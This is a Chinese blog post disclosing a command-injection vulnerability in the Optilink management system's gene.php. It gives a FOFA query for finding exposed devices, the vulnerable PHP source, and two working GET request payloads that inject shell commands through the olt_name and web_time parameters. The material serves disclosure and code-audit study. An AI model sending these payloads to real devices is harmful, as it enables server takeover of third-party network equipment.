---
title: "Optilink 管理系统 gene.php 命令执行漏洞"
source: https://mrxn.net/jswz/optilink-cgi-fsystem-gene-2rce.html
asset_dir: assets/optilink-管理系统-gene.php-命令执行漏洞
---

# Optilink 管理系统 gene.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/19 08:15
- 1314浏览
- [0评论](#comment)
- 44分钟阅读

深入探索

web服务器

SQL

软件

---

# 漏洞简介

Optilink 管理系统 gene.php 文件存在[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

101-V1.2.0-en-200723

# fofa语法

> `body="/html/css/dxtdata.css" && title="login"`

# 漏洞分析

直接看 `cgi/fsystem/gene.php` 业务逻辑实现

深入探索

服务器安全服务

Windows安全工具

企业安全咨询

```
<?
if($glang == "cn"){
    $navtitle = "基本信息";
}
else{
    $navtitle = "BaseInfo";
}

$save = $_GET["save"];
if($save==1) {
    $m_desc = snmp_set($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.2","0","s",$desc);
    $m_loc = snmp_set($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.3","0","s",$loc);
    $m_contact = snmp_set($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.4","0","s",$contact);
    $m_mtu = snmp_set($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.9","0","i",$mtu);

    $desc = $_GET["desc"];
    $loc = $_GET["loc"];
    $contact = $_GET["contact"];
    $mtu = $_GET["mtu"];

    $session = new SNMP(SNMP::VERSION_2C, $snmp_ip, "$snmp_write");
    $session->set(array($m_desc), array('s'), array($desc));
    $session->set(array($m_loc), array('s'), array($loc));
    $session->set(array($m_contact), array('s'), array($contact));

    if($mtu>=1500 && $mtu<=2021 ){
        snmpset($snmp_ip, "$snmp_write", $m_mtu,"i", $mtu, 0, 0);
    }    
}

$olt_op = $_GET["olt_op"];
/* olt name 配置保存*/
if($olt_op==1){
    $olt_name = $_GET["olt_name"];
    shell_exec('rm oltName.txt -rf');
    shell_exec('echo '.$olt_name.' > oltName.txt'); 

    shell_exec('rm /mnt/oltName.txt -rf');
    shell_exec('echo '.$olt_name.' > /mnt/oltName.txt');     
}

$m_olt_name = file_get_contents('oltName.txt');

#web超时时间读取与配置
$time = $_GET["time"];
if($time==1){
    $webTimeOut = $_GET["web_time"];
    shell_exec('rm timeOut_web.txt -rf');
    shell_exec('echo '.$webTimeOut.' > timeOut_web.txt'); 

    shell_exec('rm /mnt/timeOut_web.txt -rf');
    shell_exec('echo '.$webTimeOut.' > /mnt/timeOut_web.txt');

    SetCookie("timeOut","");
    SetCookie("timeOut",$webTimeOut);
}

$web_sw_ver=$custVersion; //加入web版本号，方便后续查看;
$dev_model = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.3.1","0");
$dev_serial = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.3.2","0");
$dev_sw_ver = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.3.3","0");
$dev_desc = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.2","0");
$dev_loc = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.3","0");
$dev_contact = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.4","0");
$dev_mtu = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.9","0");
$dev_cpu = snmp_get($snmp_ip,".1.3.6.1.4.1.$vendorId.1.3.1.1.8","0");

snmp_set_quick_print(1);
$dev_model = snmpget($snmp_ip, "$snmp_read", $dev_model);
$array=array('16843009' => 'EPON-2U8P', '17105153' => 'EPON-1U2P', '17170689' => 'EPON-1U8P', '17172225' => 'FD1216S', '17236225' => 'EPON-1U4P', '17236993' => 'EPON-1U4P', '17237761' => 'EPON-1U4P', '17238529' => 'EPON-1U4P');
for(reset($array); $i = key($array); next($array)){
    if("$i"==$dev_model){
        $dev_model = $array[$i];    
    }
}

$dev_serial = snmpget($snmp_ip, "$snmp_read", $dev_serial);
$dev_serial = substr($dev_serial, 1, strlen($dev_serial)-2);
$serial=explode(" ", $dev_serial);
$m_serial='';
for($i=0;$i<strlen($dev_serial);$i++){
    $m_serial.=chr(hexdec($serial[$i]));
}
$dev_serial=$m_serial;

$dev_sw_ver = snmpget($snmp_ip,"$snmp_read", $dev_sw_ver);
$dev_sw_ver=substr($dev_sw_ver, 1, strlen($dev_sw_ver)-2);
$sw_ver=explode(" ", $dev_sw_ver);
$m_sw_ver='';
for($i=0;$i<strlen($dev_sw_ver);$i++){
    $m_sw_ver.=chr(hexdec($sw_ver[$i]));
}
$dev_sw_ver = $m_sw_ver;

$dev_desc = snmpget($snmp_ip, "$snmp_write", $dev_desc);
$dev_loc = snmpget($snmp_ip, "$snmp_write", $dev_loc);
$dev_contact = snmpget($snmp_ip, "$snmp_write", $dev_contact);

$dev_mtu = snmpget($snmp_ip, "$snmp_write", $dev_mtu);
$dev_cpu = snmpget($snmp_ip,"$snmp_read",$dev_cpu);

?>
1
```

用户可控的输入（`olt_name` 和 `web_time` 参数）未经充分过滤或转义，直接拼接到操作系统命令中并通过 `shell_exec` 函数执行，导致[命令执行漏洞](https://mrxn.net/tag/rce)。

- GET参数 `olt_op` 等于 `1` 时， `$_GET["olt_name"]` -> `$olt_name` -> `shell_exec()`
- GET参数 `time` 等于 `1` 时，`$_GET["web_time"]` -> `$webTimeOut` -> `shell_exec()`

# 漏洞复现

## olt\_name

```
GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;ifconfig>%20test.txt;%20%23%20 HTTP/1.1
Host: optilink.mrxn.net
```

## web\_time

```
GET /cgi/fsystem/gene.php?time=1&web_time=;ifconfig>%20test.txt;%20%23%20 HTTP/1.1
Host: optilink.mrxn.net
```

访问命令执行结果文件 `/cgi/fsystem/test.txt`

[![Optilink 管理系统 gene.php 命令执行漏洞](images/img-001-9eac5948dff6.webp)](https://image.mrxn.net/45d4cf877cc543e2b01cbc1489ba3839.webp)

- 标签：
- [#网络安全](https://mrxn.net/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.olt\_name](#toc-5-1-)
- [5.2.web\_time](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
